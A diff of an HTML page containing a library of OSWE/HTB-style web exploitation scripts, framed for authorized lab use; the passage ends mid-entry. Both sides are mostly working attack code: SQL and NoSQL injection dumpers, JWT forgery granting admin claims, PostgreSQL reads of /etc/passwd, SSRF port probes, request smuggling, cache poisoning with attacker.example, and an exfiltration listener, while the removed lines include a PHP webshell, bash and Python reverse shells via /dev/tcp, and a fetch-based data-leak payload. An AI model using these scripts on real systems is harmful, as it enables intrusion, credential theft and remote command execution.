@@ -368,7 +368,7 @@
       </div>
       <aside class="status">
         <strong>Content boundary</strong>
-        <p>This initial version uses sanitized generic skeletons. Replace or extend entries with your approved OSWE/HTB-derived scripts before relying on it as the final library.</p>
+        <p>Sanitized public rebuild from local HTB Senior Web Penetration Tester material and your Skeleton Scripts retrieval patterns. Edit placeholders before use against an authorized lab target.</p>
       </aside>
     </section>
 
@@ -403,26 +403,64 @@
               <ol>
                 <li>START HERE - main.py Full Chain Skeleton</li>
                 <li>REPLACE login() - Form CSRF</li>
-                <li>REPLACE exploit() - Boolean Oracle Dump</li>
+                <li>REPLACE exploit() - Boolean SQLi Dump</li>
+                <li>ADD - oracle_dump_helpers</li>
                 <li>REPLACE dump() - Proof File</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>Auth / JWT bypass</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>ADD - jwt_forge</li>
+                <li>REPLACE login() - JWT Cookie Forge</li>
+                <li>REPLACE exploit() - Prototype Pollution Admin Claim</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>NoSQL dump</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>REPLACE login() - JSON Bearer Token</li>
+                <li>REPLACE exploit() - NoSQL Regex Dump</li>
+                <li>HTB EXAMPLE - NoSQL Regex Dump</li>
               </ol>
             </article>
             <article class="recipe-card">
               <h3>Upload webshell RCE</h3>
               <ol>
                 <li>START HERE - main.py Full Chain Skeleton</li>
-                <li>ADD - webshell_builder</li>
+                <li>ADD - file_upload_builder</li>
                 <li>REPLACE exploit() - File Upload Webshell</li>
                 <li>REPLACE run_cmd() - Webshell</li>
+                <li>REPLACE dump() - Proof File</li>
               </ol>
             </article>
             <article class="recipe-card">
               <h3>OOB callback</h3>
               <ol>
                 <li>START HERE - HTTP Listener</li>
-                <li>REPLACE build_response - JS Callback</li>
+                <li>REPLACE build_response - JS Exfil Payload</li>
                 <li>START HERE - main.py Full Chain Skeleton</li>
                 <li>REPLACE exploit() - XXE OOB</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>Deserialization RCE</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>ADD - payload_builder</li>
+                <li>REPLACE exploit() - Deserialization RCE Delivery</li>
+                <li>REPLACE dump() - Proof File</li>
+              </ol>
+            </article>
+            <article class="recipe-card">
+              <h3>Logic bug exploit</h3>
+              <ol>
+                <li>START HERE - main.py Full Chain Skeleton</li>
+                <li>ADD - json_param_mutator</li>
+                <li>REPLACE exploit() - Logic Bug Availability Bypass</li>
+                <li>HTB EXAMPLE - Parameter Logic Bug Chain</li>
               </ol>
             </article>
           </div>
@@ -453,402 +491,476 @@
   <script>
     const scripts = [
       {
-        id: "main-full-chain",
-        title: "START HERE - main.py Full Chain Skeleton",
-        type: "START HERE",
-        area: "Main",
-        slot: "copy first",
-        summary: "Base attacker script copied first for a complete OSWE-style exploit chain.",
-        filename: "main_full_chain_skeleton.py",
-        code: `#!/usr/bin/env python3
-import requests
-import urllib3
-
-urllib3.disable_warnings()
-
-TARGET = "http://target"       # EDIT
-PROXY = None                   # EDIT: {"http": "http://127.0.0.1:8080"}
-USERNAME = "admin"             # EDIT
-PASSWORD = "password"          # EDIT
-CALLBACK_HOST = "127.0.0.1"    # EDIT
-CALLBACK_PORT = 8000           # EDIT
-
-s = requests.Session()
-s.verify = False
-s.proxies = PROXY
-
-def login():
-    return True
-
-def exploit():
-    raise NotImplementedError("replace exploit()")
-
-def dump():
-    return None
-
-def run_cmd(cmd):
-    raise NotImplementedError("replace run_cmd()")
-
-def main():
-    login()
-    exploit()
-    dump()
-
-if __name__ == "__main__":
-    main()
-`
+            "id": "main-full-chain",
+            "title": "START HERE - main.py Full Chain Skeleton",
+            "type": "START HERE",
+            "area": "Main",
+            "slot": "copy first",
+            "summary": "Base attacker script for one complete OSWE-style target exploit chain.",
+            "filename": "main_full_chain_skeleton.py",
+            "code": "#!/usr/bin/env python3\nimport json\nimport time\nimport requests\nimport urllib3\n\nurllib3.disable_warnings()\n\nTARGET = \"http://target\"              # EDIT\nPROXY = None                          # EDIT: {\"http\": \"http://127.0.0.1:8080\"}\nUSERNAME = \"user\"                     # EDIT\nPASSWORD = \"pass\"                     # EDIT\nCALLBACK_HOST = \"127.0.0.1\"           # EDIT\nCALLBACK_PORT = 8000                  # EDIT\nTIMEOUT = 15\n\ns = requests.Session()\ns.verify = False\ns.proxies = PROXY\ns.headers.update({\"User-Agent\": \"oswe-exploit-builder/1.0\"})\n\ndef login():\n    return True\n\ndef exploit():\n    raise NotImplementedError(\"replace exploit()\")\n\ndef dump():\n    return None\n\ndef run_cmd(cmd):\n    raise NotImplementedError(\"replace run_cmd(cmd)\")\n\ndef main():\n    login()\n    result = exploit()\n    if result is not None:\n        print(f\"[+] exploit result: {result}\")\n    dump()\n\nif __name__ == \"__main__\":\n    main()\n"
       },
       {
-        id: "listener-http",
-        title: "START HERE - HTTP Listener",
-        type: "START HERE",
-        area: "Listener",
-        slot: "separate terminal",
-        summary: "Minimal HTTP callback receiver for OOB payloads and quick request logging.",
-        filename: "http_listener.py",
-        code: `#!/usr/bin/env python3
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import urlparse, parse_qs
-
-HOST = "0.0.0.0"     # EDIT
-PORT = 8000          # EDIT
-
-def build_response(path, query, body):
-    return b"ok"
-
-class Handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        parsed = urlparse(self.path)
-        query = parse_qs(parsed.query)
-        print(f"[+] GET {parsed.path} {query}")
-        body = build_response(parsed.path, query, b"")
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(body)
-
-    def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        body = self.rfile.read(length)
-        parsed = urlparse(self.path)
-        query = parse_qs(parsed.query)
-        print(f"[+] POST {parsed.path} {query} {body!r}")
-        out = build_response(parsed.path, query, body)
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(out)
-
-def main():
-    print(f"[+] listening on http://{HOST}:{PORT}")
-    HTTPServer((HOST, PORT), Handler).serve_forever()
-
-if __name__ == "__main__":
-    main()
-`
+            "id": "listener-http",
+            "title": "START HERE - HTTP Listener",
+            "type": "START HERE",
+            "area": "Listener",
+            "slot": "separate terminal",
+            "summary": "Minimal callback receiver for OOB proof, exfiltration, and payload hosting.",
+            "filename": "http_listener.py",
+            "code": "#!/usr/bin/env python3\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse, parse_qs\n\nHOST = \"0.0.0.0\"      # EDIT\nPORT = 8000           # EDIT\n\ndef build_response(path, query, body):\n    return 200, {\"Content-Type\": \"text/plain\"}, b\"ok\"\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        parsed = urlparse(self.path)\n        self.reply(parsed.path, parse_qs(parsed.query), b\"\")\n\n    def do_POST(self):\n        length = int(self.headers.get(\"Content-Length\", 0))\n        body = self.rfile.read(length)\n        parsed = urlparse(self.path)\n        self.reply(parsed.path, parse_qs(parsed.query), body)\n\n    def reply(self, path, query, body):\n        print(f\"[+] {self.command} {path} {query} body={body!r}\")\n        status, headers, out = build_response(path, query, body)\n        self.send_response(status)\n        for key, value in headers.items():\n            self.send_header(key, value)\n        self.end_headers()\n        self.wfile.write(out)\n\nprint(f\"[+] listening on http://{HOST}:{PORT}\")\nHTTPServer((HOST, PORT), Handler).serve_forever()\n"
       },
       {
-        id: "login-form-csrf",
-        title: "REPLACE login() - Form CSRF",
-        type: "REPLACE",
-        area: "Login",
-        slot: "replaces login()",
-        summary: "Logs in by extracting a CSRF token from the login form.",
-        filename: "replace_login_form_csrf.py",
-        code: `LOGIN_PATH = "/login"          # EDIT
-CSRF_FIELD = "csrf_token"     # EDIT
-
-def login():
-    r = s.get(f"{TARGET}{LOGIN_PATH}")
-    token = parse_csrf(r.text, CSRF_FIELD)
-
-    data = {
-        "username": USERNAME,
-        "password": PASSWORD,
-        CSRF_FIELD: token,
-    }
-    r = s.post(f"{TARGET}{LOGIN_PATH}", data=data)
-    r.raise_for_status()
-
-    if "logout" not in r.text.lower():
-        raise RuntimeError("login failed")
-
-    print("[+] logged in")
-    return True
-`
+            "id": "listener-https-b64",
+            "title": "START HERE - HTTPS B64 Decoder",
+            "type": "START HERE",
+            "area": "Listener",
+            "slot": "separate terminal",
+            "summary": "HTTPS listener that decodes base64 callback data from a query parameter.",
+            "filename": "https_b64_decoder.py",
+            "code": "#!/usr/bin/env python3\nfrom http import server\nfrom urllib.parse import urlparse, parse_qs\nimport base64\nimport json\nimport ssl\n\nHOST = \"0.0.0.0\"      # EDIT\nPORT = 4443           # EDIT\nCERT = \"server.pem\"   # EDIT\nPARAM = \"r\"           # EDIT\n\nclass Handler(server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        query = parse_qs(urlparse(self.path).query)\n        if PARAM in query:\n            try:\n                decoded = base64.b64decode(query[PARAM][0] + \"===\").decode(errors=\"replace\")\n                try:\n                    print(json.dumps(json.loads(decoded), indent=2))\n                except json.JSONDecodeError:\n                    print(decoded)\n            except Exception as exc:\n                print(f\"[-] decode failed: {exc}\")\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(b\"ok\")\n\nhttpd = server.HTTPServer((HOST, PORT), Handler)\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(CERT)\nhttpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)\nprint(f\"[+] listening on https://{HOST}:{PORT}\")\nhttpd.serve_forever()\n"
       },
       {
-        id: "exploit-boolean-oracle",
-        title: "REPLACE exploit() - Boolean Oracle Dump",
-        type: "REPLACE",
-        area: "Exploit",
-        slot: "replaces exploit()",
-        summary: "Uses a boolean response difference to extract a value character by character.",
-        filename: "replace_exploit_boolean_oracle.py",
-        code: `DUMP_PATH = "/vulnerable/search"  # EDIT
-INJ_PARAM = "q"                  # EDIT
-TRUE_MARKER = "match"            # EDIT
-ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
-
-def oracle(prefix):
-    payload = {INJ_PARAM: f"admin' AND secret LIKE '{prefix}%'--"}
-    r = s.get(f"{TARGET}{DUMP_PATH}", params=payload)
-    return TRUE_MARKER in r.text.lower()
-
-def exploit():
-    value = ""
-    while True:
-        found = False
-        for ch in ALPHABET:
-            probe = value + ch
-            if oracle(probe):
-                value = probe
-                found = True
-                print(f"[+] {value}")
-                break
-        if not found:
-            break
-    return value
-`
+            "id": "login-form-csrf",
+            "title": "REPLACE login() - Form CSRF",
+            "type": "REPLACE",
+            "area": "Login",
+            "slot": "replaces login()",
+            "summary": "Authenticates by reading a CSRF token from an HTML login form.",
+            "filename": "replace_login_form_csrf.py",
+            "code": "LOGIN_PATH = \"/login\"              # EDIT\nCSRF_FIELD = \"csrf_token\"          # EDIT\nSUCCESS_MARKER = \"logout\"          # EDIT\n\ndef login():\n    r = s.get(f\"{TARGET}{LOGIN_PATH}\", timeout=TIMEOUT)\n    r.raise_for_status()\n    token = parse_csrf(r.text, CSRF_FIELD)\n    data = {\"username\": USERNAME, \"password\": PASSWORD, CSRF_FIELD: token}\n    r = s.post(f\"{TARGET}{LOGIN_PATH}\", data=data, timeout=TIMEOUT)\n    r.raise_for_status()\n    if SUCCESS_MARKER.lower() not in r.text.lower():\n        raise RuntimeError(\"login failed\")\n    print(\"[+] logged in\")\n    return True\n"
       },
       {
-        id: "exploit-time-sqli",
-        title: "REPLACE exploit() - Time SQLi Dump",
-        type: "REPLACE",
-        area: "Exploit",
-        slot: "replaces exploit()",
-        summary: "Extracts data using response delay as the oracle.",
-        filename: "replace_exploit_time_sqli.py",
-        code: `import time
-
-DUMP_PATH = "/vulnerable/search"  # EDIT
-INJ_PARAM = "q"                  # EDIT
-DELAY = 3                        # EDIT
-THRESHOLD = 2.2                  # EDIT
-ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
-
-def is_true(prefix):
-    payload = {
-        INJ_PARAM: f"admin' AND IF(secret LIKE '{prefix}%', SLEEP({DELAY}), 0)--"
-    }
-    start = time.time()
-    s.get(f"{TARGET}{DUMP_PATH}", params=payload)
-    return time.time() - start > THRESHOLD
-
-def exploit():
-    value = ""
-    while True:
-        for ch in ALPHABET:
-            if is_true(value + ch):
-                value += ch
-                print(f"[+] {value}")
-                break
-        else:
-            return value
-`
+            "id": "login-json-bearer",
+            "title": "REPLACE login() - JSON Bearer Token",
+            "type": "REPLACE",
+            "area": "Login",
+            "slot": "replaces login()",
+            "summary": "Authenticates to a JSON API and stores the returned bearer token.",
+            "filename": "replace_login_json_bearer.py",
+            "code": "LOGIN_PATH = \"/api/auth/login\"     # EDIT\nTOKEN_KEY = \"token\"                # EDIT\n\ndef login():\n    r = s.post(f\"{TARGET}{LOGIN_PATH}\", json={\"username\": USERNAME, \"password\": PASSWORD}, timeout=TIMEOUT)\n    r.raise_for_status()\n    token = r.json().get(TOKEN_KEY)\n    if not token:\n        raise RuntimeError(\"missing bearer token\")\n    s.headers.update({\"Authorization\": f\"Bearer {token}\"})\n    print(\"[+] bearer token installed\")\n    return True\n"
       },
       {
-        id: "exploit-upload-webshell",
-        title: "REPLACE exploit() - File Upload Webshell",
-        type: "REPLACE",
-        area: "Exploit",
-        slot: "replaces exploit()",
-        summary: "Uploads a simple webshell and verifies that the command endpoint works.",
-        filename: "replace_exploit_file_upload_webshell.py",
-        code: `UPLOAD_PATH = "/upload"                 # EDIT
-SHELL_URL = "/uploads/shell.php"       # EDIT
-SHELL_FIELD = "file"                   # EDIT
-
-def exploit():
-    shell = build_php_webshell()
-    files = {
-        SHELL_FIELD: ("shell.php", shell, "application/x-php"),
-    }
-    r = s.post(f"{TARGET}{UPLOAD_PATH}", files=files)
-    r.raise_for_status()
-
-    test = run_cmd("id")
-    if not test:
-        raise RuntimeError("webshell uploaded but command output is empty")
-
-    print(f"[+] webshell ready: {TARGET}{SHELL_URL}")
-    print(test)
-`
+            "id": "login-jwt-cookie-forge",
+            "title": "REPLACE login() - JWT Cookie Forge",
+            "type": "REPLACE",
+            "area": "Login",
+            "slot": "replaces login()",
+            "summary": "Builds a lab JWT cookie after a weak or known signing secret is confirmed.",
+            "filename": "replace_login_jwt_cookie_forge.py",
+            "code": "JWT_SECRET = \"change-me\"           # EDIT\nCOOKIE_NAME = \"session\"            # EDIT\nJWT_ALG = \"HS256\"                  # EDIT\n\ndef login():\n    claims = {\"username\": USERNAME, \"isAdmin\": True, \"role\": \"admin\"}\n    s.cookies.set(COOKIE_NAME, forge_jwt(claims, JWT_SECRET, JWT_ALG))\n    print(\"[+] forged JWT cookie installed\")\n    return True\n"
       },
       {
-        id: "run-cmd-webshell",
-        title: "REPLACE run_cmd() - Webshell",
-        type: "REPLACE",
-        area: "Exploit",
-        slot: "replaces run_cmd(cmd)",
-        summary: "Sends one command through a webshell parameter.",
-        filename: "replace_run_cmd_webshell.py",
-        code: `SHELL_URL = "/uploads/shell.php"  # EDIT
-CMD_PARAM = "cmd"                   # EDIT
-
-def run_cmd(cmd):
-    r = s.get(f"{TARGET}{SHELL_URL}", params={CMD_PARAM: cmd})
-    r.raise_for_status()
-    return r.text.strip()
-`
+            "id": "exploit-xpath-probe",
+            "title": "REPLACE exploit() - XPath Boolean Probe",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Tests XPath injection with a boolean marker and leaves the oracle ready for dumping.",
+            "filename": "replace_exploit_xpath_probe.py",
+            "code": "XPATH_PATH = \"/search\"             # EDIT\nXPATH_PARAM = \"q\"                  # EDIT\nTRUE_MARKER = \"result\"             # EDIT\n\ndef xpath_oracle(expr):\n    payload = f\"' or ({expr}) or 'a'='b\"\n    r = s.get(f\"{TARGET}{XPATH_PATH}\", params={XPATH_PARAM: payload}, timeout=TIMEOUT)\n    r.raise_for_status()\n    return TRUE_MARKER.lower() in r.text.lower()\n\ndef exploit():\n    assert xpath_oracle(\"1=1\")\n    assert not xpath_oracle(\"1=0\")\n    print(\"[+] XPath oracle confirmed\")\n    return True\n"
       },
       {
-        id: "dump-proof-file",
-        title: "REPLACE dump() - Proof File",
-        type: "REPLACE",
-        area: "Exploit",
-        slot: "replaces dump()",
-        summary: "Reads proof files through an existing command execution primitive.",
-        filename: "replace_dump_proof_file.py",
-        code: `PROOF_PATHS = [
-    "/home/user/proof.txt",  # EDIT
-    "/root/proof.txt",       # EDIT
-]
-
-def dump():
-    for path in PROOF_PATHS:
-        try:
-            out = run_cmd(f"cat {path}")
-            if out:
-                print(f"[+] {path}: {out}")
-        except Exception as e:
-            print(f"[-] failed {path}: {e}")
-`
+            "id": "exploit-nosql-regex-dump",
+            "title": "REPLACE exploit() - NoSQL Regex Dump",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Extracts a Mongo-style value using a JSON $regex oracle.",
+            "filename": "replace_exploit_nosql_regex_dump.py",
+            "code": "NOSQL_PATH = \"/api/lookup\"         # EDIT\nFIELD = \"trackingNum\"              # EDIT\nTRUE_MARKER = \"valid\"              # EDIT\nPREFIX = \"\"                        # EDIT\nALPHABET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-.\"\nMAX_LEN = 80\n\ndef nosql_oracle(value):\n    r = s.post(f\"{TARGET}{NOSQL_PATH}\", json={FIELD: value}, timeout=TIMEOUT)\n    r.raise_for_status()\n    return TRUE_MARKER.lower() in r.text.lower()\n\ndef exploit():\n    value = PREFIX\n    for _ in range(MAX_LEN):\n        for ch in ALPHABET:\n            if nosql_oracle({\"$regex\": \"^\" + value + ch}):\n                value += ch\n                print(f\"[+] {value}\")\n                break\n        else:\n            break\n    return value\n"
       },
       {
-        id: "build-response-js",
-        title: "REPLACE build_response - JS Callback",
-        type: "REPLACE",
-        area: "Listener",
-        slot: "replaces build_response()",
-        summary: "Listener response builder that returns JavaScript for callback-based chains.",
-        filename: "replace_build_response_js_callback.py",
-        code: `def build_response(path, query, body):
-    payload = """
-fetch('/admin/debug')
-  .then(r => r.text())
-  .then(t => fetch('/leak?d=' + btoa(t)));
-"""
-    return payload.encode()
-`
+            "id": "exploit-boolean-sqli-dump",
+            "title": "REPLACE exploit() - Boolean SQLi Dump",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Extracts a string with a boolean SQLi oracle and printable ASCII tests.",
+            "filename": "replace_exploit_boolean_sqli_dump.py",
+            "code": "from urllib.parse import quote_plus\n\nSQLI_PATH = \"/api/check\"            # EDIT\nSQLI_PARAM = \"u\"                    # EDIT\nTARGET_USER = \"admin\"               # EDIT\nTRUE_MARKER = \"taken\"               # EDIT\nQUERY = \"SELECT password FROM users WHERE username='admin'\"  # EDIT\nMAX_LEN = 80\n\ndef oracle(condition):\n    inj = quote_plus(f\"{TARGET_USER}' AND ({condition})-- -\")\n    r = s.get(f\"{TARGET}{SQLI_PATH}?{SQLI_PARAM}={inj}\", timeout=TIMEOUT)\n    r.raise_for_status()\n    return TRUE_MARKER.lower() in r.text.lower()\n\ndef exploit():\n    out = \"\"\n    for pos in range(1, MAX_LEN + 1):\n        for c in range(32, 127):\n            if oracle(f\"ASCII(SUBSTRING(({QUERY}),{pos},1))={c}\"):\n                out += chr(c)\n                print(f\"[+] {out}\")\n                break\n        else:\n            return out\n    return out\n"
       },
       {
-        id: "helper-csrf-token",
-        title: "ADD - csrf_token",
-        type: "ADD",
-        area: "Helper",
-        slot: "helper",
-        summary: "Parses a CSRF token from an HTML input field.",
-        filename: "add_csrf_token.py",
-        code: `from bs4 import BeautifulSoup
-
-def parse_csrf(html, field_name):
-    soup = BeautifulSoup(html, "html.parser")
-    field = soup.find("input", {"name": field_name})
-    if not field or not field.get("value"):
-        raise RuntimeError(f"missing CSRF field: {field_name}")
-    return field["value"]
-`
+            "id": "exploit-boolean-sqli-bisect",
+            "title": "REPLACE exploit() - Boolean SQLi Bisect Dump",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Uses bisection to reduce boolean SQLi requests per character.",
+            "filename": "replace_exploit_boolean_sqli_bisect_dump.py",
+            "code": "QUERY = \"SELECT password FROM users WHERE username='admin'\"  # EDIT\nMAX_LEN = 80\n\ndef dump_ascii_bisect(pos):\n    low, high = 32, 126\n    while low <= high:\n        mid = (low + high) // 2\n        if oracle(f\"ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}\"):\n            low = mid + 1\n        else:\n            high = mid - 1\n    return chr(low) if 32 <= low <= 126 else None\n\ndef exploit():\n    out = \"\"\n    for pos in range(1, MAX_LEN + 1):\n        ch = dump_ascii_bisect(pos)\n        if not ch:\n            break\n        out += ch\n        print(f\"[+] {out}\")\n    return out\n"
       },
       {
-        id: "helper-webshell-builder",
-        title: "ADD - webshell_builder",
-        type: "ADD",
-        area: "Helper",
-        slot: "helper",
-        summary: "Builds a small PHP command webshell payload.",
-        filename: "add_webshell_builder.py",
-        code: `def build_php_webshell():
-    return b"<?php system($_GET['cmd'] ?? 'id'); ?>"
-`
+            "id": "exploit-time-sqli-bitwise",
+            "title": "REPLACE exploit() - Time SQLi Bitwise Dump",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Dumps a value through delayed responses and bitwise ASCII reconstruction.",
+            "filename": "replace_exploit_time_sqli_bitwise_dump.py",
+            "code": "TIME_PATH = \"/\"                    # EDIT\nDELAY = 2                           # EDIT\nTHRESHOLD = 1.7                     # EDIT\nQUERY = \"SELECT DB_NAME()\"          # EDIT\nMAX_LEN = 80\n\ndef time_oracle(condition):\n    headers = {\"User-Agent\": f\"';IF ({condition}) WAITFOR DELAY '0:0:{DELAY}'--\"}\n    start = time.time()\n    s.get(f\"{TARGET}{TIME_PATH}\", headers=headers, timeout=TIMEOUT + DELAY)\n    return time.time() - start > THRESHOLD\n\ndef dump_number(expr):\n    value = 0\n    for bit in range(7):\n        if time_oracle(f\"({expr})&{2 ** bit}>0\"):\n            value |= 2 ** bit\n    return value\n\ndef exploit():\n    length = dump_number(f\"LEN(({QUERY}))\")\n    out = \"\"\n    for pos in range(1, min(length, MAX_LEN) + 1):\n        out += chr(dump_number(f\"ASCII(SUBSTRING(({QUERY}),{pos},1))\"))\n        print(f\"[+] {out}\")\n    return out\n"
       },
       {
-        id: "helper-revshell-builder",
-        title: "ADD - revshell_builder",
-        type: "ADD",
-        area: "Helper",
-        slot: "helper",
-        summary: "Builds common reverse shell command strings.",
-        filename: "add_revshell_builder.py",
-        code: `def bash_revshell(host, port):
-    return f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
-
-def python_revshell(host, port):
-    return (
-        "python3 -c 'import os,pty,socket;"
-        f"s=socket.socket();s.connect((\\"{host}\\",{port}));"
-        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\"/bin/bash\\")'"
-    )
-`
+            "id": "exploit-pgsql-file-read",
+            "title": "REPLACE exploit() - PostgreSQL File Read",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Shapes a PostgreSQL injection that reads a server-side file through a reflected result.",
+            "filename": "replace_exploit_pgsql_file_read.py",
+            "code": "PG_PATH = \"/search\"                # EDIT\nPG_PARAM = \"q\"                      # EDIT\nFILE_PATH = \"/etc/passwd\"           # EDIT\nMARKER_START = \"__BEGIN__\"\nMARKER_END = \"__END__\"\n\ndef exploit():\n    payload = \"'; SELECT '\" + MARKER_START + \"' || pg_read_file('\" + FILE_PATH + \"', 0, 4096) || '\" + MARKER_END + \"'--\"\n    r = s.get(f\"{TARGET}{PG_PATH}\", params={PG_PARAM: payload}, timeout=TIMEOUT)\n    r.raise_for_status()\n    if MARKER_START in r.text and MARKER_END in r.text:\n        return r.text.split(MARKER_START, 1)[1].split(MARKER_END, 1)[0]\n    print(\"[-] file content not reflected; adapt query sink\")\n    return None\n"
       },
       {
-        id: "example-boolean-oracle",
-        title: "HTB EXAMPLE - Boolean Oracle Dump",
-        type: "HTB EXAMPLE",
-        area: "Example",
-        slot: "complete example",
-        summary: "Complete sanitized script showing how a boolean oracle dump fits together.",
-        filename: "example_boolean_oracle_dump.py",
-        code: `#!/usr/bin/env python3
-import requests
-import urllib3
-from bs4 import BeautifulSoup
-
-urllib3.disable_warnings()
-
-TARGET = "http://target"       # EDIT
-PROXY = None                   # EDIT
-USERNAME = "admin"             # EDIT
-PASSWORD = "password"          # EDIT
-LOGIN_PATH = "/login"          # EDIT
-DUMP_PATH = "/vulnerable/search"  # EDIT
-CSRF_FIELD = "csrf_token"      # EDIT
-TRUE_MARKER = "match"          # EDIT
-ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789{}_-.@"
-
-s = requests.Session()
-s.verify = False
-s.proxies = PROXY
-
-def parse_csrf(html, field_name):
-    soup = BeautifulSoup(html, "html.parser")
-    field = soup.find("input", {"name": field_name})
-    if not field or not field.get("value"):
-        raise RuntimeError(f"missing CSRF field: {field_name}")
-    return field["value"]
-
-def login():
-    r = s.get(f"{TARGET}{LOGIN_PATH}")
-    token = parse_csrf(r.text, CSRF_FIELD)
-    data = {"username": USERNAME, "password": PASSWORD, CSRF_FIELD: token}
-    r = s.post(f"{TARGET}{LOGIN_PATH}", data=data)
-    r.raise_for_status()
-    print("[+] logged in")
-
-def oracle(prefix):
-    payload = {"q": f"admin' AND secret LIKE '{prefix}%'--"}
-    r = s.get(f"{TARGET}{DUMP_PATH}", params=payload)
-    return TRUE_MARKER in r.text.lower()
-
-def exploit():
-    value = ""
-    while True:
-        for ch in ALPHABET:
-            if oracle(value + ch):
-                value += ch
-                print(f"[+] {value}")
-                break
-        else:
-            return value
-
-def main():
-    login()
-    secret = exploit()
-    print(f"[+] final: {secret}")
-
-if __name__ == "__main__":
-    main()
-`
+            "id": "exploit-ssrf-two-step-iframe",
+            "title": "REPLACE exploit() - SSRF Two-Step Iframe Probe",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Stores an iframe payload, then triggers a renderer/PDF endpoint to probe internal services.",
+            "filename": "replace_exploit_ssrf_two_step_iframe_probe.py",
+            "code": "STORE_PATH = \"/actions/store\"      # EDIT\nTRIGGER_PATH = \"/actions/render\"   # EDIT\nHOST_TO_PROBE = \"127.0.0.1\"        # EDIT\nPORTS = [80, 443, 8080, 8443, 3000, 5000, 8000, 27017]\n\ndef exploit():\n    for port in PORTS:\n        payload = f'<iframe src=\"http://{HOST_TO_PROBE}:{port}/\" width=\"800\" height=\"500\"></iframe>'\n        s.post(f\"{TARGET}{STORE_PATH}\", data={\"title\": \"probe\", \"note\": payload}, timeout=TIMEOUT)\n        r = s.get(f\"{TARGET}{TRIGGER_PATH}\", timeout=TIMEOUT)\n        print(f\"[+] port {port}: status={r.status_code} bytes={len(r.content)}\")\n"
+      },
+      {
+            "id": "exploit-dns-rebind-check",
+            "title": "REPLACE exploit() - DNS Rebinding Check",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Uses a controlled hostname in a server-side fetch feature and logs whether callbacks arrive.",
+            "filename": "replace_exploit_dns_rebinding_check.py",
+            "code": "FETCH_PATH = \"/api/fetch-url\"       # EDIT\nREBIND_HOST = \"attacker-controlled.example\"  # EDIT\nINTERNAL_URL = f\"http://{REBIND_HOST}/admin\" # EDIT\n\ndef exploit():\n    r = s.post(f\"{TARGET}{FETCH_PATH}\", json={\"url\": INTERNAL_URL}, timeout=TIMEOUT)\n    r.raise_for_status()\n    print(\"[+] fetch submitted; watch listener/DNS logs\")\n    print(r.text[:500])\n"
+      },
+      {
+            "id": "exploit-http-cache-poison",
+            "title": "REPLACE exploit() - HTTP Cache Poison Check",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Sends paired requests to test whether unkeyed headers or parameters poison cached responses.",
+            "filename": "replace_exploit_http_cache_poison_check.py",
+            "code": "CACHE_PATH = \"/\"                   # EDIT\nCACHE_BUSTER = \"oswecache\"         # EDIT\nPOISON_HEADER = \"X-Forwarded-Host\"  # EDIT\nPOISON_VALUE = \"attacker.example\"   # EDIT\n\ndef exploit():\n    params = {CACHE_BUSTER: str(int(time.time()))}\n    poison = s.get(f\"{TARGET}{CACHE_PATH}\", params=params, headers={POISON_HEADER: POISON_VALUE}, timeout=TIMEOUT)\n    clean = s.get(f\"{TARGET}{CACHE_PATH}\", params=params, timeout=TIMEOUT)\n    print(f\"[+] poison status={poison.status_code} clean status={clean.status_code}\")\n    print(clean.text[:800])\n"
+      },
+      {
+            "id": "exploit-request-smuggling-raw",
+            "title": "REPLACE exploit() - Request Smuggling Raw Probe",
+            "type": "REPLACE",
+            "area": "Exploit",
+            "slot": "replaces exploit()",
+            "summary": "Sends a raw HTTP desync probe for lab validation through a front-end/back-end pair.",
+            "filename": "replace_exploit_request_smuggling_raw_probe.py",
+            "code": "import socket\n\nHOST = \"target\"                    # EDIT, no scheme\nPORT = 80                           # EDIT\n\ndef send_raw(req):\n    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:\n        sock.sendall(req.encode())\n        return sock.recv(8192).decode(errors=\"replace\")\n\ndef exploit():\n    req = (\n        f\"POST / HTTP/1.1\\r\\nHost: {HOST}\\r\\n\"\n        \"Transfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\"\n        \"Connection: close\\r\\n\\r\\n0\\r\\n\\r\\n\"\n    )\n    print(send_raw(req))\n"
+      },
+      {
+            "id": "exploit-ssti-command",
